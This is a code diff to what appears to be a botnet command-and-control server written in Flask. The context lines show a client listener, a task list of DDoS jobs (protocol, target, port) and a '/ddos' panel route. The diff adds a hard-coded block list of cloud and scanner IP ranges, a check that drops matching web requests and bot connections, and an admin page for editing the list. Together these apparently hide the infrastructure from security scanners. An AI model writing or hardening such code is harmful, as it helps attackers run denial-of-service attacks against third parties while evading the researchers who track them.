@@ -18,6 +18,35 @@ from flask import (
     abort, redirect, url_for, session, flash, Response, g
 )
 
+# ——————— BOT BLOCKER STATE ———————
+SETTINGS_FILE = 'blocked.json'
+DEFAULT_BLOCK = [
+    # AWS scanners
+    "3.130.96.", "3.131.215.38", "3.132.23.201",
+    "3.137.73.221", "3.143.33.63", "3.149.59.26",
+    # Azure probes
+    "20.12.240.188", "20.64.105.250", "20.163.3.234",
+    # DigitalOcean / Droplets
+    "167.94.145.", "167.94.138.180", "167.94.146.59",
+    "167.94.145.111",
+    # Linode & similar
+    "45.156.130.",
+    # Hetzner cloud scanners
+    "185.247.137.", "87.236.176.",
+    # Other cloud/VPN hosts
+    "206.168.34.68", "206.168.34.87",
+    "47.237.163.151",
+    "152.32.140.206", "152.32.234.184",
+    "162.142.125.", "188.92.79.113",
+    "199.45.154.", "44.247.74.215", "64.62.156.222",
+    # Asia-centric mass scans
+    "36.106.166.197", "36.106.167.216", "36.106.167.79",
+    "111.113.89.74", "112.94.253.30", "120.0.52.21",
+    "123.245.84.161", "171.117.226.73", "180.95.238.218",
+    "182.138.158.188"
+]
+blocked_ips = []
+
 # ——————— APP SETUP ———————
 app = Flask(__name__)
 app.secret_key = secrets.token_urlsafe(32)
@@ -40,9 +69,15 @@ logger.addHandler(ch)
 # ——————— REQUEST LOGGING ———————
 @app.before_request
 def before_request():
+    # ——— bot-blocker: drop unwanted clients ———
+    ip = request.remote_addr
+    if any(ip == b or ip.startswith(b) for b in blocked_ips):
+        logger.warning(f"Blocked bot request {ip} to {request.path}")
+        abort(403)
+
     g.start = time.time()
     if request.method != 'GET':
-        logger.info(f"HTTP {request.method} {request.path} from {request.remote_addr}")
+        logger.info(f"HTTP {request.method} {request.path} from {ip}")
 
 @app.after_request
 def after_request(resp):
@@ -61,6 +96,23 @@ modules     = {}    # name -> { path, meta }
 ddos_tasks  = []    # each: {id, client_id, protocol, target, port, ends, status}
 registry_lock = threading.Lock()
 MODULES_DIR = 'modules'
+
+
+def load_blocked():
+    global blocked_ips
+    if os.path.exists(SETTINGS_FILE):
+        with open(SETTINGS_FILE, 'r') as f:
+            blocked_ips = json.load(f)
+    else:
+        # seed with defaults on first run
+        blocked_ips = DEFAULT_BLOCK.copy()
+        save_blocked()
+
+def save_blocked():
+    with open(SETTINGS_FILE, 'w') as f:
+        json.dump(blocked_ips, f)
+
+load_blocked()
 
 # ——————— AUTH DECORATOR ———————
 def login_required(f):
@@ -128,6 +180,12 @@ def listener(host, port):
     logger.info(f"Listening for clients on {host}:{port}")
     while True:
         conn, addr = sock.accept()
+        client_ip = addr[0]
+        # drop bots immediately
+        if any(client_ip == b or client_ip.startswith(b) for b in blocked_ips):
+            logger.info(f"Blocked bot connection from {addr}")
+            conn.close()
+            continue
         cid = uuid.uuid4().hex[:8]
         now = time.strftime("%Y-%m-%d %H:%M:%S")
         with registry_lock:
@@ -250,6 +308,22 @@ def stream(cid):
                     yield f"data: {line}\n\n"
                 idx = len(buf)
     return Response(gen(), mimetype='text/event-stream')
+
+@app.route('/blocker', methods=('GET','POST'))
+@login_required
+def blocker():
+    if request.method == 'POST':
+        ip = request.form.get('ip','').strip()
+        act = request.form.get('action')
+        if act == 'add' and ip and ip not in blocked_ips:
+            blocked_ips.append(ip)
+            save_blocked()
+            flash(f'Blocked {ip}', 'success')
+        elif act == 'remove' and ip in blocked_ips:
+            blocked_ips.remove(ip)
+            save_blocked()
+            flash(f'Unblocked {ip}', 'info')
+    return render_template('blocker.html', blocked=blocked_ips)
 
 # ——————— DDoS PANEL ———————
 @app.route('/ddos')
